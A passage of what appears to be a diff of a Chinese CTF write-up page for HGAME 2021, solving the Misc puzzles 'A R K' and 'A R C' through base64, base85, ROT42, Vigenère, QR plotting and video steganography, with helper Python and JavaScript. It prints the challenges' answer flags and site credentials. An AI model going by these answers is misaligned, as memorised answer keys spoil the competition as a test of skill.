xx+pmL73BfXL7ViMmUNJmSJvM//sj/80d+5o/8zAmFlaSwkhRWksJKUlhJCitpMiVNpqTJlLxPpuR9MiXvk7lvHJlMx5HJdByZTMeRyXQcmcz9QZO50mSuNJkrTeZKk7nSZK40mStN5kqTudJkrjSZK03mSpO50mSuNJkrTeZKk7nSZK40mStN5kqTudJkrjSZK03mSpO50mSuNJkrTeZKk7nSZC40mRpv3JjMv7gxmX9xYzL/4sZk/sWNyfyNO5OpAU2mBjSZGtBkakCTqQFNpgY0mRrQZGpAk6kBTaYGNJka0GRqQJOpAU2mBjSZGtBkakCTqQFNpgY0mRrQZGpAk6kBTaYGNJka0GRqQJOpAU2mBjSZGtBkakCTqQFNpoY0mfnGkcl0HJlMx5HJTHlcmvK4NOVxacKrHmrCqx5qwqseasrj0pTHpSmPS19cfI364vJf7ZH/auSUOuUpdcpT6pSn1ClPqVOeUr+4ODR8cfmEe+QTTvzgfk34g/s14Q/u15QmM6XJTGkyE/7gfk34g/s14Q/uf/GicflNpuTjlVDYlBQ2JYWtN44orOOIwjqOKKzjiMI6jiis44jCOo4orOOIwtYPUtiSFLYkhS1JYUtS2JIUtiSFLUlhS1LYkhS2JIUtSWFLUtiSFLYkhS1JYUtS2JIUtiSFLUlhS1LYkhS2JIUtSWFLUtiSFLYkhS1JYUtS2JIUtiSFxRtHFNZxRGEdRxTWcURhHUcU1nFEYR1HFNZxRGHxgxQWksJCUlhICgtJYSEpLCSFhaSwkBQWksJCUlhICgtJYSEpLCSFhaSwkBQWksJCUlhICgtJYSEpLCSFhaSwkBQWksJCUlhICgtJYSEpLCSF5RtHFNZxRGEdRxT2xcUf3Benf3Difd5xdFdYx9FdYR1Hd4V1HN0V1nF0V1jH0V1hHUd3hXUc3RXWcXRX2BeXT7gln3BLPuHIutRxtC51HK1LHUfrUsfRupQ/uC6lXJdSrksp16UvLt9qKd9qKd9qZNRLOeqlHPVSjnopR72Uo17KUS/lqJdy1Eu5LqVcl1KuSynXpZTrUsp16X/80Lh8pZZ8pZKZI+XMkXLmeN44mjk6jmaOjqOZo+No5ug4mjk6jmaOjqOZo+No5ug4mjk6jmaOjqOZo+No5ug4mjk6jmaOjqOZo+No5ug4mjk6jmaOjqOZ409xdmzTQBQFUbQXxxshZvRFDWTEBEhsgGQWCXDo3m35FXHSCeYWcCaOmCMbZI5I5ohkjkjmiGSOSOaIZI5I5ohkjkjmiGSOSOaIZI5I5ohkjkjmiGSOSOaIZI5I5ohkjkjmiGSOSOaIZI5I5ohkjkjmiGSOSOaIZI4+4og5Jo6YY+KIOSaOmGPiiDkmjphj4og5Jo6YY+KIOSaOmGPiiDkmjphj4og5Jo6YY+KIOSaOmGPiiDkmjphj4og5Jo6YoxtkjkrmqGSOSuaoZI5K5qhkjkrmqGSOSuaoZI5K5qhkjkrmqGSOSuaoZI5K5qhkjkrmqGSOSuaoZI5K5qhkjkrmqGSOSuaoZI5K5pj4MMf7dvr9OD5/vt/2/f7X1fW01vO6z5djf/36+z+9HJfz+Xq9AVBLAQI/ABQAAAAIALdiS1Ki22GCdCgAABi+BQANACQAAAAAAAAAIAAAAAAAAABkZWZhdWx0X2VudHJ5CgAgAAAAAAABABgAGc6HaC0A1wEZzodoLQDXAdynh2gtANcBUEsFBgAAAAABAAEAXwAAAJ8oAAAAAA==&quot;</span>,<span class="attr">&quot;playerDataDelta&quot;</span>:&#123;<span class="attr">&quot;modified&quot;</span>:&#123;&#125;,<span class="attr">&quot;deleted&quot;</span>:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中 replay 的数据是一段 base64 编码，将其解码后可得一压缩包。修正其文件头为 <code>50 4B 03 04</code> 之后可以解压得到如下数据。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613400294020.b5ad967d3747e19900a851948dbd2e397263fbd8.png"></p>
+<p>通过观察不难发现其中包含坐标数据，使用正则匹配将其取出后整理。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">regex = <span class="string">r&quot;&#123;\&quot;row\&quot;:(\d&#123;2&#125;),\&quot;col\&quot;:(\d&#123;2&#125;)&#125;&#125;&quot;</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;F:\\CTFs\\2021\\HGAME\\Misc\\A R K\\default_entry&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>)</span><br><span class="line">content = file.read()</span><br><span class="line">file.close()</span><br><span class="line">matches = re.findall(regex, content, re.MULTILINE)</span><br><span class="line"><span class="built_in">print</span>(matches)</span><br></pre></td></tr></table></figure>
+
+<p>使用 Excel 画出坐标散点图。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613399763417.f841baa0b6c01f42c871bd01f3d4c507685fca84.png"></p>
+<p>扫描二维码可得 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Did_y0u_ge7_Dusk?&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="A-R-C"><a href="#A-R-C" class="headerlink" title="A R C"></a>A R C</h3><p>将图片中内容抄取出来，得到如下内容。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BK0ICG]Qr*88_$gC,&#39;-j2+KH86?Q&quot;%928;LG@O*!Am0+&#96;;E7iV2agSE&lt;c&#39;U;6Yg^#H?!YBAQ]</span><br></pre></td></tr></table></figure>
+
+<p>将其 base85 解码一次可得如下内容。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h8btxsWpHnJEj1aL5G3gBuMTKNPAwcF4fZodR9XQ7DSUVm2yCkr6zqiveY</span><br></pre></td></tr></table></figure>
+
+<p>根据提示可知这是 BV 号和 AV 号转换的时候所用的 table。网上找个编码 BV 号的脚本并换一下表。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>bv2av<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>BV &lt;-&gt; AV<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;bv&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;BV&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;AV2bv()&quot;</span>&gt;</span>&lt;-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;bv2av()&quot;</span>&gt;</span>-&gt;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;av&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;AV&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 作者：mcfx</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// 链接：https://www.zhihu.com/question/381784377/answer/1099438784</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// 来源：知乎</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">bv2av</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> bv = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;bv&#x27;</span>).value;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&#x27;av&#x27;</span>).value = dec(bv);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">AV2bv</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> av = +<span class="built_in">document</span>.getElementById(<span class="string">&#x27;av&#x27;</span>).value;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&#x27;bv&#x27;</span>).value = enc(av);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> table = <span class="string">&#x27;h8btxsWpHnJEj1aL5G3gBuMTKNPAwcF4fZodR9XQ7DSUVm2yCkr6zqiveY&#x27;</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> tr = &#123;&#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">58</span>; i++)</span></span><br><span class="line">            tr[table[i]] = i</span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> s = [<span class="number">11</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>]</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> xor = <span class="number">177451812</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> add = <span class="number">8728348608</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">dec</span>(<span class="params">x</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> r = <span class="number">0</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span></span><br><span class="line">                r += tr[x[s[i]]] * 58 ** i</span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> (r - add) ^ xor</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">enc</span>(<span class="params">x</span>) </span>&#123;</span></span><br><span class="line">            x = (x ^ xor) + add</span><br><span class="line"><span class="javascript">            r = <span class="string">&#x27;BV1  4 1 7  &#x27;</span>.split(<span class="string">&#x27;&#x27;</span>)</span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span></span><br><span class="line"><span class="javascript">                r[s[i]] = table[<span class="built_in">parseInt</span>(x / <span class="number">58</span> ** i) % <span class="number">58</span>]</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> r.join(<span class="string">&#x27;&#x27;</span>)</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1614930816508.8dbb6f09919d7b898a935f195e07f7eb444516ea.png"></p>
+<p>得到了 <code>BV17f411J77h</code>，将其作为密码解压 BVenc(10001540).7z。打开视频可以得到如下两段内容。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1614931302198.59bef60e3bd2489c98493476b8510366f87a15c8.png"></p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">What is The answer to live, the universe and everything?</span><br><span class="line"></span><br><span class="line">#)+F7IIMEH:?Injiikffi</span><br><span class="line">pwbvmpoakiscqdobil</span><br></pre></td></tr></table></figure>
+
+<p>同时 Fragments.txt 中有如下内容。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">zB7&#x3D; ?I DEJ &gt;;H;&#96; 8KJ &#125; MH?J; ?J 8;97KI; OEK C7O D;;: CEH; MEH:I JE 7D7BOI?I M&gt;7J ;D9E:?D&#x3D; J&gt;; B?D;e ?Ib</span><br><span class="line">zEH B?D;f&#96; &quot;?A? &gt;7I JEB: OEK M&gt;7J ?J ?I&#96; 7D: uA?H7 ?I D;9;II7HO JE :E ?Jb</span><br><span class="line">*ME OEKD&#x3D; &#x3D;?HBI ;NFBEH; 7 I&gt;7JJ;H;: MEHB:&#96; &lt;?BB;: M?J&gt; IEKD:n 7 F7IJ JE 8; KD9EL;H;:bbb</span><br><span class="line">y79&gt; 7M7A;DI ?D J&gt;?I 8B7DA&#96; HK?Da:EJJ;: MEHB: JE :?I9EL;H J&gt;7J I&gt;; ?I ;GK7BBO 8B7DA&#96; H;C;C8;H?D&#x3D; DEJ&gt;?D&#x3D; E&lt; M&gt;7J 97C; 8;&lt;EH;b</span><br><span class="line">uD: J&gt;;D J&gt;;O C7A; 7 I;9ED: :?I9EL;HOn J&gt;; uH97;7&#96; CKBJ?JK:;I E&lt; &lt;BE7J?D&#x3D; &#x3D;B7IIaB?A; I&gt;7H:I 9EDJ7?D?D&#x3D; L?L?: C;CEH?;I E&lt; J&gt;; F7IJb</span><br></pre></td></tr></table></figure>
+
+<p>视频中的问题的答案很明显是 42，因此将上述内容做 <code>ROT 42</code> 变换得到如下内容。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Flag is not here, but I write it because you may need more words to analysis what encoding the line1 is.</span><br><span class="line">For line2, Liki has told you what it is, and Akira is necessary to do it.</span><br><span class="line">Two young girls explore a shattered world, filled with sound: a past to be uncovered...</span><br><span class="line">Each awakens in this blank, ruin-dotted world to discover that she is equally blank, remembering nothing of what came before.</span><br><span class="line">And then they make a second discovery: the Arcaea, multitudes of floating glass-like shards containing vivid memories of the past.</span><br></pre></td></tr></table></figure>
+
+<p>根据提示将视频中第二段的第一行做 <code>ROT 42</code> 变换得到如下内容。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MSUpasswordis:6557225</span><br></pre></td></tr></table></figure>
+
+<p>根据搜索可以发现<a target="_blank" rel="noopener" href="http://www.compression.ru/video/stego_video/index_en.html">插件</a>，在给出的软件中加载插件，打开视频后设置如下参数。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1614932436434.9e17251eefdf4db39761c4a7e426d03d13497739.png"></p>
+<p>此时再渲染保存文件为 .avi 即可得到插件提取出的如下隐藏内容。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arc.hgame2021.cf</span><br><span class="line">Hikari</span><br><span class="line">Tairitsu</span><br></pre></td></tr></table></figure>
+
+<p>将上述内容作为网址和用户名密码登录后可进入一个没什么信息的网站。此时回过头来发现提示信息中曾经提到过 Arcaea，因此猜测密文 <code>pwbvmpoakiscqdobil</code> 的解密内容跟这个音游相关。根据提示在 week1 Crypto 第一题的解密过程中找到了如下内容。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Vigenere-Liki</span><br><span class="line">Vigenere-Liki:&#125;VkmvJb!1XtAxe!hpM1&#123;M+9xqzrTM_Nj~cRg4x</span><br></pre></td></tr></table></figure>
+
+<p>猜测使用的加密方法是 Vigenère，于是尝试使用 akira 作为 key 解密。得到了可读的内容 <code>pmtempestissimobyd</code>。将其拼接到网站路径中访问后即可得到 flag。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1614933099107.f6fbedecb5bf3678fd864560388c886334140e3c.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Y0u_Find_Pur3_Mem0ry&#125;</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hitchhiking-in-the-Galaxy"><span class="toc-number">1.1.</span> <span class="toc-text">Hitchhiking_in_the_Galaxy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#watermelon"><span class="toc-number">1.2.</span> <span class="toc-text">watermelon</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%B3%95"><span class="toc-number">1.2.1.</span> <span class="toc-text">代码审计法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9D%E8%97%8F%E8%B5%B0%E7%A7%81%E8%80%85"><span class="toc-number">1.3.</span> <span class="toc-text">宝藏走私者</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%99%BA%E5%95%86%E6%A3%80%E6%B5%8B%E9%B8%A1"><span class="toc-number">1.4.</span> <span class="toc-text">智商检测鸡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%B0%E7%A7%81%E8%80%85%E7%9A%84%E6%84%A4%E6%80%92"><span class="toc-number">1.5.</span> <span class="toc-text">走私者的愤怒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Liki%E7%9A%84%E7%94%9F%E6%97%A5%E7%A4%BC%E7%89%A9"><span class="toc-number">1.6.</span> <span class="toc-text">Liki的生日礼物</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Forgetful"><span class="toc-number">1.7.</span> <span class="toc-text">Forgetful</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LazyDogR4U"><span class="toc-number">1.8.</span> <span class="toc-text">LazyDogR4U</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#200OK"><span class="toc-number">1.9.</span> <span class="toc-text">200OK!!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Base%E5%85%A8%E5%AE%B6%E7%A6%8F"><span class="toc-number">2.1.</span> <span class="toc-text">Base全家福</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E8%B5%B7%E7%9C%BC%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%85%BB%E6%88%90%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.</span> <span class="toc-text">不起眼压缩包的养成的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Galaxy"><span class="toc-number">2.3.</span> <span class="toc-text">Galaxy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Word-RE-MASTER"><span class="toc-number">2.4.</span> <span class="toc-text">Word RE:MASTER</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tools"><span class="toc-number">2.5.</span> <span class="toc-text">Tools</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Telegraph%EF%BC%9A1601-6639-3459-3134-0892"><span class="toc-number">2.6.</span> <span class="toc-text">Telegraph：1601 6639 3459 3134 0892</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hallucigenia"><span class="toc-number">2.7.</span> <span class="toc-text">Hallucigenia</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS"><span class="toc-number">2.8.</span> <span class="toc-text">DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#A-R-K"><span class="toc-number">2.9.</span> <span class="toc-text">A R K</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#A-R-C"><span class="toc-number">2.10.</span> <span class="toc-text">A R C</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-CN/posts/484ca20c.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-CN/posts/484ca20c.html&text=HGAME 2021"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-CN/posts/484ca20c.html&title=HGAME 2021"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-CN/posts/484ca20c.html&is_video=false&description=HGAME 2021"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HGAME 2021&body=Check out this article: https://lemonprefect.cn/zh-CN/posts/484ca20c.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-CN/posts/484ca20c.html&title=HGAME 2021"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-CN/posts/484ca20c.html&title=HGAME 2021"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-CN/posts/484ca20c.html&title=HGAME 2021"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-CN/posts/484ca20c.html&title=HGAME 2021"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-CN/posts/484ca20c.html&name=HGAME 2021&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-CN/posts/484ca20c.html&t=HGAME 2021"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+        
+        
+        <li>
+        
+          <a href="#">简</a>
+        
+          <a href="/en">En</a>
+        
+          <a href="/zh-TW">正</a>
+        
+        </li>
+      </ul>
+    </nav>
+  </div>
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2021
+    LemonPrefect
+    湘ICP备20002800号
+    
+      <img src="/images/beian.png"/>
+      湘公网安备43021102000188号
+    
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
